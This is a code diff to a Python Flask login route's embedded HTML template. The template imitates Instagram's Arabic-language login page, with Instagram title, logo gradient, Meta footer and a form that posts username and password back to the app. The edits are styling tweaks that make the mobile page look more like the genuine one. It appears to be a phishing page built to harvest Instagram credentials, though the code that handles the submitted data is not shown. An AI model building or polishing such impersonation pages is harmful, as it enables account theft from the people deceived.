@@ -48,7 +48,7 @@ def login():
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تسجيل الدخول • Instagram</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
@@ -57,62 +57,63 @@ def login():
             background: #121212; 
             color: #f5f5f5;
             width: 100vw; 
-            min-height: 100vh; 
+            height: 100vh; 
             display: flex; 
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
+            overflow: hidden;
         }
         
         .main-wrapper {
             width: 100%;
+            max-width: 350px;
             display: flex;
             flex-direction: column;
             align-items: center;
             flex: 1;
-            padding: 20px 20px 10px 20px;
-            max-width: 350px;
+            padding: 10px 20px 0 20px;
+            justify-content: center;
         }
 
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             text-align: center;
             width: 100%;
         }
 
         .insta-icon-container {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             display: flex;
             justify-content: center;
             width: 100%;
         }
         
         .insta-icon {
-            width: 58px;
-            height: 58px;
+            width: 52px;
+            height: 52px;
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-            border-radius: 15px;
+            border-radius: 13px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
         .insta-icon svg {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             fill: white;
         }
 
         .error-msg { 
             color: #ed4956; 
-            font-size: 13px; 
-            line-height: 18px; 
-            margin-bottom: 15px; 
+            font-size: 12px; 
+            line-height: 16px; 
+            margin-bottom: 12px; 
             text-align: center; 
-            font-weight: 400; 
             background: #1c1c1c; 
-            padding: 12px; 
+            padding: 10px; 
             border-radius: 8px; 
             border: 1px solid #331a1a; 
             width: 100%;
@@ -126,16 +127,16 @@ def login():
         
         .input-group input { 
             width: 100%; 
-            background: #262626; 
+            background: #121212; 
             border: 1px solid #363636; 
             border-radius: 8px; 
-            padding: 14px 12px; 
-            font-size: 14px; 
+            padding: 12px; 
+            font-size: 13px; 
             color: #f5f5f5; 
             outline: none; 
         }
         .input-group input:focus { border-color: #a8a8a8; }
-        .input-group input::placeholder { color: #8e8e8e; }
+        .input-group input::placeholder { color: #737373; }
 
         .submit-btn { 
             width: 100%; 
@@ -143,35 +144,33 @@ def login():
             color: white; 
             border: none; 
             border-radius: 8px; 
-            padding: 12px; 
+            padding: 11px; 
             font-size: 14px; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-top: 10px; 
-            margin-bottom: 15px; 
+            margin-top: 8px; 
+            margin-bottom: 12px; 
         }
         .submit-btn:hover { background: #1877f2; }
 
-        .forgot-pass { color: #f5f5f5; font-size: 13px; text-decoration: none; display: block; margin-top: 5px; font-weight: 400; text-align: center; width: 100%; margin-bottom: 30px;}
+        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; font-weight: 400; text-align: center; width: 100%; margin-bottom: 24px; }
 
-        /* بطاقة إنشاء حساب جديدة تحت تسجيل الدخول مباشرة */
         .signup-card { 
-            padding: 13px; 
+            padding: 11px; 
             width: 100%; 
             border: 1px solid #363636; 
             border-radius: 8px; 
             text-align: center; 
-            font-size: 14px; 
+            font-size: 13px; 
             color: #0095f6; 
             font-weight: 600; 
             cursor: pointer; 
             background: #121212;
         }
 
-        /* فوتر Meta في الأسفل تماماً */
         .footer-section { 
             width: 100%; 
-            padding: 15px 0; 
+            padding-bottom: 15px; 
             text-align: center; 
             display: flex; 
             justify-content: center; 
@@ -183,15 +182,15 @@ def login():
             display: flex; 
             align-items: center; 
             justify-content: center; 
-            gap: 5px;
+            gap: 4px;
         }
         .meta-symbol {
-            font-size: 16px;
+            font-size: 15px;
             color: #737373;
             font-weight: bold;
         }
         .meta-brand {
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             color: #737373;
             letter-spacing: 0.5px;
@@ -216,7 +215,7 @@ def login():
 
         <form method="POST">
             <div class="input-group">
-                <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
+                <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" value="{{ username_val }}">
             </div>
             <div class="input-group">
                 <input type="password" name="password" required placeholder="كلمة السر">
